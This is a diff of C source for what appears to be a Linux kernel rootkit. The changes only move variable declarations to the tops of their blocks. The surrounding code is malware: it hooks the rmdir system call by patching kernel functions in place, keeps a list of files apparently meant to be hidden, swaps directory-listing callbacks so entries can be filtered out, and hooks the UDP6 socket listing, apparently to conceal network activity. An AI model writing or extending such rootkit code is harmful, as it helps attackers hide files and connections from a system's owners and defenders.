@@ -337,11 +337,13 @@ unsigned long asm_rmdir_count = 0;
 
 asmlinkage long asm_rmdir(const char __user *pathname)
 {
+    long ret;
+	
     asm_rmdir_count ++;
 
     asmlinkage long (*original_rmdir)(const char __user *);
     original_rmdir = asm_hook_unpatch(asm_rmdir);
-    long ret = original_rmdir(pathname);
+    ret = original_rmdir(pathname);
     asm_hook_patch(asm_rmdir);
 
     return ret;
@@ -560,12 +562,13 @@ LIST_HEAD(file_list);
 int file_add(const char *name)
 {
     struct file_entry *f = kmalloc(sizeof(struct file_entry), GFP_KERNEL);
+    size_t name_len;
 
     if (!f) {
         return 0;
     }
 
-    size_t name_len = strlen(name) + 1;
+    name_len = strlen(name) + 1;
 
     // sanity check as `name` could point to some garbage without null anywhere nearby
     if (name_len -1 > NAME_MAX) {
@@ -687,12 +690,13 @@ void unprotect(void)
 struct file_operations *get_fop(const char *path)
 {
     struct file *file;
+    struct file_operations *ret;
 
     if ((file = filp_open(path, O_RDONLY, 0)) == NULL) {
         return NULL;
     }
 
-    struct file_operations *ret = (struct file_operations *) file->f_op;
+    ret = (struct file_operations *) file->f_op;
     filp_close(file, 0);
 
     return ret;
@@ -903,12 +907,13 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
     #define READDIR(NAME) \
         int NAME##_iterate(struct file *file, struct dir_context *context) \
         { \
+	    int ret; \
+	    int (*original_iterate)(struct file *, struct dir_context *); \
             original_##NAME##_filldir = context->actor; \
             *((filldir_t*)&context->actor) = NAME##_filldir; \
             \
-            int (*original_iterate)(struct file *, struct dir_context *); \
             original_iterate = asm_hook_unpatch(NAME##_iterate); \
-            int ret = original_iterate(file, context); \
+            ret = original_iterate(file, context); \
             asm_hook_patch(NAME##_iterate); \
             \
             return ret; \
